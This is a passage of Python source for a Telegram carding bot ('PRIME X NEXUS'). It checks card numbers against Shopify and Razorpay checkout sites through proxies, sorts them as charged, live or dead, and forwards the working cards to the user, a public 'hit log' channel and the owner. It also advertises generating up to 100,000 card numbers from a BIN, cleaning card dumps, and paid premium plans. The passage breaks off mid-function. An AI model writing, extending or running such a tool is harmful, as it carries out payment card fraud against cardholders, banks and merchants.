        await bot.send_message(OWNER_ID, premium_emoji(admin_msg), parse_mode='html')

    except Exception as e:
        print(f"send_hit_to_admin error: {e}")

# ============================================================
# SEND CARD FILE
# ============================================================

async def send_card_file(user_id, cards, title, file_prefix, is_dead=False):
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"{file_prefix}_Cards_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write(f"⚡ {title} - 𝙋𝙍𝙄𝙈𝙀 𝙓 𝙉𝙀𝙓𝙐𝙎 ♦️ ⚡\n")
        await f.write("=" * 70 + "\n\n")
        
        for r in cards:
            card = r.get('card', 'N/A')
            gateway = r.get('gateway', 'Auto Shopify')
            price = r.get('price', '-')
            message = str(r.get('message', 'Unknown'))[:100]
            
            if '|' in card:
                brand, _, _, bank, country, flag = await get_bin_info(card.split('|')[0])
            else:
                brand = bank = country = flag = '-'
            
            is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
            currency_symbol = "₹" if is_razorpay else ""
            
            if "CHARGED" in title.upper():
                status_emoji = "💎"
                status_text = "Charged 💎"
            elif "LIVE" in title.upper():
                status_emoji = "🔥"
                status_text = "Live 🔥"
            elif "DEAD" in title.upper():
                status_emoji = "❌"
                status_text = "Dead ❌"
            else:
                status_emoji = "⚠️"
                status_text = "Unknown ⚠️"
            
            current_time = get_time()
            
            final_resp = f"""[❆] {status_text}

💳
   ⤷ <code>{r['card']}</code>
Gate ➳ {gateway} {currency_symbol}{price}
──────────

Resp ➳ {message}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🤩 ➳ <a href="tg://user?id={OWNER_ID}">{OWNER_NAME}</a>"""
            await f.write(final_resp + "\n" + "=" * 50 + "\n")

    try:
        caption_msg = f"[❆] {title} – {len(cards)} cards"
        await bot.send_file(user_id, file=filename, caption=caption_msg, parse_mode="html")
    except Exception as e:
        print(f"File send error: {e}")
        await bot.send_message(user_id, f"❌ Error sending file: {str(e)[:100]}")

    try:
        os.remove(filename)
    except:
        pass

# ============================================================
# UPDATE PROGRESS
# ============================================================

async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", is_razorpay=False):
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    current_time = now.strftime("%I:%M:%S %p IST")

    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    dead = len(results.get('dead', []))
    errors = results.get('errors', 0)
    total = results.get('total', 0)
    checked = current_attempt_count

    percentage = round((checked / total) * 100, 1) if total > 0 else 0
    bar = "█" * int(percentage/5) + "▒" * (20 - int(percentage/5))

    gateway = "Razorpay" if is_razorpay else "Shopify"

    last_cc = "—"
    last_price = "—"
    last_response = "—"
    
    if results.get('last_result'):
        last_result = results['last_result']
        last_cc = last_result.get('card', '—')
        last_price = last_result.get('price', '—')
        last_response = str(last_result.get('message', '—'))[:60]

    user_plan = "💎 Premium" if is_premium(user_id) else "👑 Admin" if is_admin(user_id) else "⭐ Free"

    text = f"""<b>⚡ 𝙋𝙍𝙄𝙈𝙀 𝙓 𝙉𝙀𝙓𝙐𝙎 ♦️⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💥 Gateway ➜ {gateway}</b>
<b>🔄 Status ➜ CHECKING...</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔗 Process➜ <code>{percentage}%</code> | <code>{checked}/{total}</code></b>
<b>💳 CC ➜ <code>{last_cc}</code></b>
<b>💰 Price ➜ <code>{last_price}$</code></b>
<b>❌ Res ➜ <code>{last_response}</code></b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Approved ➜ {approved}</b>
<b>💎 Charged ➜ {charged}</b>
<b>❌ Dead ➜ {dead}</b>
<b>⚠️ Errors ➜ {errors}</b>
<b>⏳ Time ➜ {current_time}</b>  
━━━━━━━━━━━━━━━━━━━━
<b>👑 Checked By ➜ <a href="tg://user?id={user_id}">{first_name}</a> [{user_plan}]</b>
<b>🤖 Bot By ➜ <a href="tg://user?id={OWNER_ID}">{OWNER_NAME}</a></b>"""

    buttons = [
        [
            Button.inline(f"🔥 Live ({approved})", f"live_{message_id}".encode(), style="primary"),
            Button.inline(f"💎 Charged ({charged})", f"charged_{message_id}".encode(), style="primary")
        ],
        [
            Button.inline(f"❌ Dead ({dead})", f"dead_{message_id}".encode(), style="danger"),
            Button.inline("🛑 Stop", f"stop_{message_id}".encode(), style="danger")
        ]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(text), buttons=buttons, parse_mode="html")
    except Exception:
        pass

async def send_final_results(chat_id, results):
    if not results or not isinstance(results, dict):
        results = {'charged': [], 'approved': [], 'dead': [], 'error_cards': [], 'api_errors': 0, 'errors': 0, 'total': 0, 'start_time': time.time()}
    
    if 'start_time' not in results:
        results['start_time'] = time.time()
    
    error_count = len(results.get('error_cards', []))
    api_error_count = results.get('api_errors', 0)
    
    if 'total' not in results:
        results['total'] = len(results.get('charged', [])) + len(results.get('approved', [])) + len(results.get('dead', [])) + error_count

    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results.get('charged'):
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results.get('approved'):
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"
    
    gateway = "Auto Shopify"
    price = "0.00"
    
    if results.get("charged"):
        gateway = results["charged"][0].get("gateway", "Auto Shopify")
        price = results["charged"][0].get("price", "-")
    elif results.get("approved"):
        gateway = results["approved"][0].get("gateway", "Auto Shopify")
        price = results["approved"][0].get("price", "-")

    summary = f"""<b>⚡𝙋𝙍𝙄𝙈𝙀 𝙓 𝙉𝙀𝙓𝙐𝙎 ♦️⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 Results</b>
<blockquote>💳 Total: {results.get('total', 0)} | ✅ Charged: {len(results.get('charged', []))} | 🔥 Live: {len(results.get('approved', []))} | ❌ Dead: {len(results.get('dead', []))} | ⚠️ Error: {error_count} | ⚠️ API Error: {api_error_count}</blockquote>
<blockquote>🌐 Gateway ⇾ 🔥 {gateway} | 💰 {price}</blockquote> 
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 Hits</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id={OWNER_ID}">{OWNER_NAME}</a></b>"""

    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Checker_Result_{chat_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡𝙋𝙍𝙄𝙈𝙀 𝙓 𝙉𝙀𝙓𝙐𝙎 ♦️ - Final Results 💳⚡\n")
        await f.write("=" * 70 + "\n\n")
        
        await f.write(f"📊 SUMMARY\n")
        await f.write(f"Total Cards: {results.get('total', 0)}\n")
        await f.write(f"✅ Charged: {len(results.get('charged', []))}\n")
        await f.write(f"🔥 Approved: {len(results.get('approved', []))}\n")
        await f.write(f"❌ Dead: {len(results.get('dead', []))}\n")
        await f.write(f"⚠️ Errors: {error_count}\n")
        await f.write(f"⚠️ API Errors: {api_error_count}\n")
        await f.write(f"⏱️ Time: {hours}h {minutes}m {seconds}s\n")
        await f.write(f"🌐 Gateway: {gateway}\n")
        await f.write(f"💰 Price: {price}\n")
        await f.write("=" * 70 + "\n\n")

        if results.get('charged'):
            await f.write(f"✅ CHARGED ({len(results.get('charged', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('charged', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")

        if results.get('approved'):
            await f.write(f"🔥 APPROVED ({len(results.get('approved', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('approved', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")

        if results.get('dead'):
            await f.write(f"❌ DEAD ({len(results.get('dead', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('dead', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")

        error_cards = results.get('error_cards', [])
        if error_cards:
            await f.write(f"⚠️ ERRORS ({len(error_cards)}):\n")
            await f.write("-" * 70 + "\n")
            for r in error_cards:
                error_msg = str(r.get('message', 'Unknown Error'))[:500]
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {error_msg}\n")

    try:
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s")
        await asyncio.sleep(e.seconds)
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
    except Exception as e:
        print(f"Send final error: {e}")
        await bot.send_message(chat_id, premium_emoji(summary), parse_mode="html")

    try: os.remove(filename)
    except: pass

# ============================================================
# COPY CC HANDLER
# ============================================================

@bot.on(events.CallbackQuery(pattern=rb"copycc_(.+)"))
async def copycc_handler(event):
    try:
        cc = event.pattern_match.group(1).decode()
        await event.answer("✅ CC Copied!", alert=True)
        await event.reply(premium_emoji(f"<tg-spoiler><code>{cc}</code></tg-spoiler>"), parse_mode='html')
    except:
        await event.answer("❌ Error!", alert=True)

# ============================================================
# BUTTON HANDLERS
# ============================================================

@bot.on(events.CallbackQuery(pattern=b"charged_"))
async def charged_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    
    if user_id in last_click and (now - last_click[user_id]) < 30:
        remaining = int(30 - (now - last_click[user_id]))
        await event.answer(f"⏳ Wait {remaining}s", alert=True)
        return
    last_click[user_id] = now
    
    msg_id = int(event.data.decode().split("_")[1])
    session_key = f"{user_id}_{msg_id}"
    if session_key not in active_sessions:
        session_key = f"rz_{user_id}_{msg_id}"
    
    results = active_sessions.get(session_key, {}).get('results', {})
    cards = results.get('charged', [])
    
    if not cards:
        await event.answer("❌ No charged cards yet!", alert=True)
        return
    
    await send_card_file(user_id, cards, "CHARGED 💎", "charged")
    await event.answer(f"✅ {len(cards)} charged cards sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"live_"))
async def live_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    
    if user_id in last_click and (now - last_click[user_id]) < 30:
        remaining = int(30 - (now - last_click[user_id]))
        await event.answer(f"⏳ Wait {remaining}s", alert=True)
        return
    last_click[user_id] = now
    
    msg_id = int(event.data.decode().split("_")[1])
    session_key = f"{user_id}_{msg_id}"
    if session_key not in active_sessions:
        session_key = f"rz_{user_id}_{msg_id}"
    
    results = active_sessions.get(session_key, {}).get('results', {})
    cards = results.get('approved', [])
    
    if not cards:
        await event.answer("❌ No live cards yet!", alert=True)
        return
    
    await send_card_file(user_id, cards, "LIVE 🔥", "live")
    await event.answer(f"✅ {len(cards)} live cards sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"dead_"))
async def dead_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    
    if user_id in last_click and (now - last_click[user_id]) < 30:
        remaining = int(30 - (now - last_click[user_id]))
        await event.answer(f"⏳ Wait {remaining}s", alert=True)
        return
    last_click[user_id] = now
    
    msg_id = int(event.data.decode().split("_")[1])
    session_key = f"{user_id}_{msg_id}"
    if session_key not in active_sessions:
        session_key = f"rz_{user_id}_{msg_id}"
    
    results = active_sessions.get(session_key, {}).get('results', {})
    cards = results.get('dead', [])
    
    if not cards:
        await event.answer("❌ No dead cards yet!", alert=True)
        return
    
    await send_card_file(user_id, cards, "DEAD ❌", "dead", is_dead=True)
    await event.answer(f"✅ {len(cards)} dead cards sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"stop_"))
async def stop_handler(event):
    user_id = event.sender_id
    try:
        msg_id = int(event.data.decode().split("_")[1])
    except:
        msg_id = event.message_id
    
    msg = await event.get_message()
    text = getattr(msg, 'message', '')
    session_key = f"rz_{user_id}_{msg_id}" if "Razorpay" in text or "rz_" in text else f"{user_id}_{msg_id}"
    
    if session_key not in active_sessions:
        session_key = f"{user_id}_{msg_id}"
    
    await event.answer("🛑 Stopping...", alert=True)
    
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await asyncio.sleep(2.0)
        
        try:
            results = active_sessions[session_key].get('results', {})
            await send_final_results(user_id, results)
        except Exception as e:
            print(f"Partial save error: {e}")
        
        if session_key in active_sessions:
            del active_sessions[session_key]
        
        try:
            await event.edit(premium_emoji("🛑 **Stopped!**"))
        except:
            pass
    else:
        await event.answer("No active session found!", alert=True)

# ============================================================
# VERIFICATION
# ============================================================

async def is_joined_channel(user_id):
    try:
        channel = await bot.get_entity(CHANNEL_1)
        try:
            await bot.get_participant(channel, user_id)
            return True
        except:
            try:
                await bot.get_permissions(channel, user_id)
                return True
            except:
                return False
    except:
        return False

async def verify_user(user_id):
    _verified_cache.pop(user_id, None)
    try:
        channel1 = await bot.get_entity(CHANNEL_1)
        await bot.get_permissions(channel1, user_id)
        channel2 = await bot.get_entity(CHANNEL_2)
        await bot.get_permissions(channel2, user_id)
        save_verified(user_id)
        _verified_cache[user_id] = True
        return True
    except:
        _verified_cache[user_id] = False
        return False

def require_verified(func):
    async def wrapper(event, *args, **kwargs):
        user_id = event.sender_id
        if is_admin(user_id):
            return await func(event, *args, **kwargs)
        if await verify_user(user_id):
            return await func(event, *args, **kwargs)
        await event.reply(premium_emoji(f"""<b>⚠️ VERIFICATION REQUIRED</b>
━━━━━━━━━━━━━━━━━━━━
Please join both channels:
1️⃣ {CHANNEL_1} (Updates)
2️⃣ {CHANNEL_2} (Hit Logs)
Then click VERIFY below."""),
        buttons=[
            [Button.url("📣 JOIN UPDATES", f"https://t.me/{CHANNEL_1[1:]}")],
            [Button.url("📊 JOIN HIT LOG", f"https://t.me/{CHANNEL_2[1:]}")],
            [Button.inline("✅ VERIFY NOW", b"verify")],
        ], parse_mode='html')
        return
    return wrapper

@bot.on(events.CallbackQuery(data=b"verify"))
async def verify_handler(event):
    user_id = event.sender_id
    await event.answer("Checking...")
    if await verify_user(user_id):
        await event.edit(premium_emoji("✅ **Verified Successfully!**\nUse /start to continue."), parse_mode='html')
    else:
        await event.answer("❌ Please join both channels first!", alert=True)

# ============================================================
# BAN CHECK DECORATOR
# ============================================================

def ban_check(func):
    async def wrapper(event, *args, **kwargs):
        user_id = event.sender_id
        if is_banned(user_id):
            await event.reply(premium_emoji(f"🚫 **You are BANNED!**\nContact {OWNER_NAME} for appeal."))
            return
        return await func(event, *args, **kwargs)
    return wrapper

# ============================================================
# START COMMAND
# ============================================================

@bot.on(events.NewMessage(pattern='/start'))
@ban_check
async def start(event):
    user_id = event.sender_id
    save_user(user_id)
    
    try:
        sender = await event.get_sender()
        name = sender.first_name or "User"
    except:
        name = "User"
    
    if await is_joined_channel(user_id) or is_admin(user_id):
        plan = "👑 Admin" if is_admin(user_id) else ("💎 Premium" if is_premium(user_id) else "⭐ Free")
        
        msg = f"""<b>🌟 {BOT_NAME}</b>
<b>{BOT_TAGLINE}</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 User:</b> {name}
<b>💠 Plan:</b> {plan}
━━━━━━━━━━━━━━━━━━━━
<b>📌 Commands:</b>
<code>/cc card|mm|yy|cvv</code> - Check single CC
<code>/rz card|mm|yy|cvv</code> - Razorpay check
<code>/chk</code> - Bulk check (reply .txt)
<code>/rzchk</code> - Razorpay bulk
<code>/plan</code> - Check your plan
<code>/redeem KEY</code> - Activate premium
<code>/gen BIN COUNT</code> - Generate CCs
<code>/scrape</code> - Clean CC file
<code>/split COUNT</code> - Split CC file
<code>/addsite url</code> - Add site
<code>/addproxy ip:port</code> - Add proxy
<code>/site</code> - Check sites
<code>/proxy</code> - Check proxies
━━━━━━━━━━━━━━━━━━━━
<b>👑 Owner:</b> {OWNER_NAME}"""
        
        buttons = [
            [Button.inline("🔍 CHECKER", b"checker"), Button.inline("💎 BUY", b"buy")],
            [Button.inline("🛠️ TOOLS", b"tools_menu"), Button.inline("🆘 SUPPORT", b"support_menu")],
            [Button.url("📣 UPDATES", f"https://t.me/{CHANNEL_1[1:]}"), Button.url("📊 HIT LOG", f"https://t.me/{CHANNEL_2[1:]}")],
        ]
        
        await bot.send_file(event.chat_id, file=PHOTO_URL,
            caption=premium_emoji(msg), buttons=buttons, parse_mode='html')
    else:
        msg = f"""<b>⚠️ VERIFICATION REQUIRED</b>
━━━━━━━━━━━━━━━━━━━━
Join both channels first:
1️⃣ {CHANNEL_1} (Updates)
2️⃣ {CHANNEL_2} (Hit Logs)"""
        
        buttons = [
            [Button.url("📣 UPDATES", f"https://t.me/{CHANNEL_1[1:]}")],
            [Button.url("📊 HIT LOG", f"https://t.me/{CHANNEL_2[1:]}")],
            [Button.inline("✅ VERIFY", b"verify")],
        ]
        
        await bot.send_message(event.chat_id, premium_emoji(msg), buttons=buttons, parse_mode='html')

# ============================================================
# CHECKER MENU
# ============================================================

@bot.on(events.CallbackQuery(data=b"checker"))
async def checker_menu(event):
    await event.edit(premium_emoji("""<b>🔒 CHECKER MENU</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Select Mode:</b>"""),
    buttons=[
        [Button.inline("🔐 AUTH", b"auth"), Button.inline("⚡ CHARGE", b"charge")],
        [Button.inline("📋 MASS", b"mass")],
        [Button.inline("🔙 BACK", b"back")]
    ], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"auth"))
async def auth_mode(event):
    await event.edit(premium_emoji("""<b>🔐 AUTH MODE</b>
━━━━━━━━━━━━━━━━━━━━
<b>Razorpay:</b> <code>/rz 4097580790933573|06|2030|208</code>
<b>Shopify:</b> <code>/cc 4097580790933573|06|2030|208</code>"""),
    buttons=[[Button.inline("🔙 BACK", b"checker")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"charge"))
async def charge_mode(event):
    await event.edit(premium_emoji("""<b>⚡ CHARGE MODE</b>
━━━━━━━━━━━━━━━━━━━━
<b>Razorpay:</b> <code>/rz 4097580790933573|06|2030|208</code>
<b>Shopify:</b> <code>/cc 4097580790933573|06|2030|208</code>"""),
    buttons=[[Button.inline("🔙 BACK", b"checker")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"mass"))
async def mass_mode(event):
    await event.edit(premium_emoji("""<b>📋 MASS CHECK</b>
━━━━━━━━━━━━━━━━━━━━
<b>Shopify:</b> <code>/chk</code> (reply to .txt)
<b>Razorpay:</b> <code>/rzchk</code> (reply to .txt)
<b>Auto Detect:</b> Share .txt file directly"""),
    buttons=[[Button.inline("🔙 BACK", b"checker")]], parse_mode='html')

# ============================================================
# TOOLS MENU
# ============================================================

@bot.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_menu(event):
    await event.answer("🔧 Tools Opened!", alert=False)
    
    tools_msg = f"""<b>🔧 {BOT_NAME} - Tools</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Select Tool Category:</b>"""

    tools_buttons = [
        [Button.inline("🛒 SHOPIFY", b"shopify_tools", style="primary"), Button.inline("💎 RAZORPAY", b"rz_tools", style="primary")],
        [Button.inline("📡 PROXY", b"proxy_tools", style="primary"), Button.inline("💳 CC TOOLS", b"cc_tools", style="primary")],
        [Button.inline("🔑 PREMIUM", b"premium_tools", style="primary")],
        [Button.inline("🔙 BACK", b"back")],
    ]

    await event.edit(premium_emoji(tools_msg), buttons=tools_buttons, parse_mode="html")

# ============================================================
# SHOPIFY TOOLS
# ============================================================

@bot.on(events.CallbackQuery(data=b"shopify_tools"))
async def shopify_tools_menu(event):
    await event.answer("🛒 Shopify Tools!", alert=False)
    
    shopify_msg = f"""<b>🛒 SHOPIFY TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/site</code>
➜ Check all Shopify sites
➜ Removes dead sites automatically
➜ Get TXT file of working sites

<code>/addsite url</code>
➜ Test & add new Shopify site
➜ Only working sites added

<code>/rmsite url</code>
➜ Remove specific Shopify site

<code>/mysites</code>
➜ View your added sites

<code>/clearsites</code>
➜ Clear all your sites

<code>/addst url</code>
➜ Admin add site to bot

<code>/rmst url</code>
➜ Admin remove site from bot
━━━━━━━━━━━━━━━━━━━━
<b>💡 Sites are loaded from sites.txt!</b>"""

    await event.edit(premium_emoji(shopify_msg), buttons=[[Button.inline("🔙 BACK", b"tools_menu", style="danger")]], parse_mode="html")

# ============================================================
# RAZORPAY TOOLS
# ============================================================

@bot.on(events.CallbackQuery(data=b"rz_tools"))
async def rz_tools_menu(event):
    await event.answer("💎 Razorpay Tools!", alert=False)
    
    rz_msg = f"""<b>💎 RAZORPAY TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/rzsites</code>
➜ Check all RZ sites
➜ Removes dead sites automatically
➜ Get TXT file of working RZ sites

<code>/addrzsites url</code>
➜ Test & add new Razorpay site
➜ Only working sites added

<code>/rmrzsites url</code>
➜ Remove specific Razorpay site
━━━━━━━━━━━━━━━━━━━━
<b>💡 Razorpay sites from rz_sites.txt!</b>"""

    await event.edit(premium_emoji(rz_msg), buttons=[[Button.inline("🔙 BACK", b"tools_menu", style="danger")]], parse_mode="html")

# ============================================================
# PROXY TOOLS
# ============================================================

@bot.on(events.CallbackQuery(data=b"proxy_tools"))
async def proxy_tools_menu(event):
    await event.answer("📡 Proxy Tools!", alert=False)
    
    proxy_msg = f"""<b>📡 PROXY TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/proxy</code>
➜ Check all proxies
➜ Removes dead proxies automatically
➜ Get TXT file of working proxies

<code>/addproxy ip:port</code>
➜ Add new proxy
➜ Only working proxies added

<code>/rmproxy ip:port</code>
➜ Remove specific proxy

<code>/myproxies</code>
➜ View your proxies

<code>/clearproxies</code>
➜ Clear all your proxies

<code>/savetxt</code>
➜ Add proxies from .txt file

<code>/chkproxy ip:port</code>
➜ Check single proxy

<code>/getproxy</code>
➜ View all proxies

<code>/rmmyproxy ip:port</code>
➜ Remove user proxy

<code>/rmproxyindex 1,2,3</code>
➜ Remove by index

<code>/clearproxy</code>
➜ Clear with backup
━━━━━━━━━━━━━━━━━━━━
<b>💡 Proxies loaded from proxy.txt!</b>"""

    await event.edit(premium_emoji(proxy_msg), buttons=[[Button.inline("🔙 BACK", b"tools_menu", style="danger")]], parse_mode="html")

# ============================================================
# CC TOOLS
# ============================================================

@bot.on(events.CallbackQuery(data=b"cc_tools"))
async def cc_tools_menu(event):
    await event.answer("💳 CC Tools!", alert=False)
    
    cc_msg = f"""<b>💳 CC TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/gen BIN COUNT</code>
➜ Generate CCs from BIN
➜ Format: /gen 601100 10000
➜ Max: 100,000 cards

<code>/scrape</code>
➜ Reply to .txt CC file
➜ Removes duplicates
➜ Removes expired cards
➜ Get clean TXT file

<code>/split COUNT</code>
➜ Reply to .txt CC file
➜ Split into smaller files
━━━━━━━━━━━━━━━━━━━━
<b>💡 Premium/Admin only!</b>"""

    await event.edit(premium_emoji(cc_msg), buttons=[[Button.inline("🔙 BACK", b"tools_menu", style="danger")]], parse_mode="html")

# ============================================================
# PREMIUM TOOLS
# ============================================================

@bot.on(events.CallbackQuery(data=b"premium_tools"))
async def premium_tools_menu(event):
    await event.answer("🔑 Premium Tools!", alert=False)
    
    premium_msg = f"""<b>🔑 PREMIUM TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/redeem KEY</code>
➜ Activate premium access
➜ Get key from {OWNER_NAME}

<code>/plan</code>
➜ Check your current plan
➜ View expiry & usage

<code>/key count days</code>
➜ Generate premium keys (Admin)

<code>/keystats KEY</code>
➜ Check key stats (Admin)

<code>/testapis</code>
➜ Test all APIs (Admin)

<b>💎 PREMIUM BENEFITS:</b>
✅ Unlimited CC checks
✅ Razorpay + Shopify
✅ No daily limit (Free: 150)
✅ Priority support
✅ Bulk up to 100K CC
━━━━━━━━━━━━━━━━━━━━
<b>📅 Plans: 7 Days - $2 | 30 Days - $5</b>
<b>👑 Buy: <a href="tg://user?id={OWNER_ID}">{OWNER_NAME}</a></b>"""

    premium_buttons = [
        [Button.url("💎 Buy Plan", f"https://t.me/{CHANNEL_1[1:]}", style="primary")],
        [Button.inline("🔙 BACK", b"tools_menu", style="danger")],
    ]

    await event.edit(premium_emoji(premium_msg), buttons=premium_buttons, parse_mode="html")

# ============================================================
# SUPPORT MENU
# ============================================================

@bot.on(events.CallbackQuery(data=b"support_menu"))
async def support_menu(event):
    user_id = event.sender_id
    
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except:
        first_name = "Unknown"

    if is_admin(user_id):
        plan = "👑 Admin"
    elif is_premium(user_id):
        plan = "💎 Premium"
    else:
        plan = "⭐ Free"

    support_msg = f"""<b>🆘 SUPPORT MENU 🆘</b>
━━━━━━━━━━━━━━━━━━━━
<b>👤 User: <a href="tg://user?id={user_id}">{first_name}</a></b>
<b>🆔 ID: <code>{user_id}</code></b>
<b>💠 Plan: {plan}</b>
━━━━━━━━━━━━━━━━━━━━
<b>💎 Premium Plans:</b>
<b>📅 7 Days - $2</b>
<b>📅 30 Days - $5</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔑 Redeem Key:</b>
<code>/redeem KEY_HERE</code>
━━━━━━━━━━━━━━━━━━━━
<b>📞 Contact Owner:</b>
<b>👑 <a href="tg://user?id={OWNER_ID}">{OWNER_NAME}</a></b>
━━━━━━━━━━━━━━━━━━━━
<b>💳 Payment:</b>
<b>• UPI • PayPal • Crypto</b>"""

    support_buttons = [
        [Button.url("💎 Buy Plan", f"https://t.me/{CHANNEL_1[1:]}", style="primary")],
        [Button.inline("🔙 BACK", b"back")],
    ]

    await event.edit(premium_emoji(support_msg), buttons=support_buttons, parse_mode="html")

# ============================================================
# BACK TO START
# ============================================================

@bot.on(events.CallbackQuery(data=b"back"))
async def back_handler(event):
    await start(event)

# ============================================================
# BUY MENU
# ============================================================

@bot.on(events.CallbackQuery(data=b"buy"))
async def buy_menu(event):
    await event.edit(premium_emoji(f"""<b>💎 PREMIUM PLANS</b>
━━━━━━━━━━━━━━━━━━━━
<b>📅 7 Days - $2</b>
<b>📅 30 Days - $5</b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Features:</b>
• Unlimited Checks
• Razorpay + Shopify
• No Daily Limit
• Priority Support
━━━━━━━━━━━━━━━━━━━━
<b>👑 Contact:</b> {OWNER_NAME}"""),
    buttons=[[Button.inline("🔙 BACK", b"back")]], parse_mode='html')

# ============================================================
# SINGLE CC CHECK
# ============================================================

@bot.on(events.NewMessage(pattern=r'^/cc\s+(.+)'))
@ban_check
@require_verified
async def single_cc(event):
    user_id = event.sender_id
    save_user(user_id)
    
    if not check_limit(user_id):
        await event.reply(premium_emoji("❌ **Daily limit reached!**\nUpgrade to premium for unlimited."))
        return
    
    cc_input = event.pattern_match.group(1).strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ **Invalid format!**\nUse: <code>/cc 4097580790933573|06|2030|208</code>"), parse_mode='html')
        return
    
    sites = load_sites()
    proxies = load_proxies()
    
    if not sites:
        await event.reply(premium_emoji("❌ No sites available!"))
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available!"))
        return
    
    card = cards[0]
    status_msg = await event.reply(premium_emoji("⚡ **Checking...**"), parse_mode='html')
    
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=8)
        update_daily_usage(user_id)
        
        bin_info = await get_bin_info(card)
        
        if result['status'] in ['Charged', 'Approved']:
            try:
                sender = await event.get_sender()
                username = sender.username or f"user_{user_id}"
            except:
                username = f"user_{user_id}"
            
            await send_hit_to_user(user_id, result)
            await send_hit_to_channel(user_id, result, username)
            await send_hit_to_admin(result, user_id, result['status'])
        
        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "PAID ✅"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "LIVE ✅"
        else:
            status_emoji = "❌"
            status_text = "DEAD ❌"
        
        response = f"""{status_emoji} <b>RESULT</b> {status_emoji}
━━━━━━━━━━━━━━━━━━━━
<b>💳 CC:</b> <tg-spoiler><code>{card}</code></tg-spoiler>
<b>Status:</b> {status_emoji} {status_text}
<b>📝 Response:</b> {result.get('message', 'Unknown')[:80]}
━━━━━━━━━━━━━━━━━━━━
<b>🌐 Gateway:</b> {result.get('gateway', 'Auto Shopify')}
<b>💰 Price:</b> ${result.get('price', '-')}
<b>🏦 Bank:</b> {bin_info.get('bank', '-')}
<b>🌍 Country:</b> {bin_info.get('country', '-')} {bin_info.get('flag', '')}
<b>⏳ Time:</b> {get_time()}"""
        
        await status_msg.edit(premium_emoji(response), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

# ============================================================
# RAZORPAY SINGLE CHECK
# ============================================================

@bot.on(events.NewMessage(pattern=r'^/rz\s+(.+)'))
@ban_check
@require_verified
async def single_rz(event):
    user_id = event.sender_id
    save_user(user_id)
    
    if not check_limit(user_id):
        await event.reply(premium_emoji("❌ **Daily limit reached!**"))
        return
    
    cc_input = event.pattern_match.group(1).strip()
    cards = extract_cc(cc_input)
    if not cards:
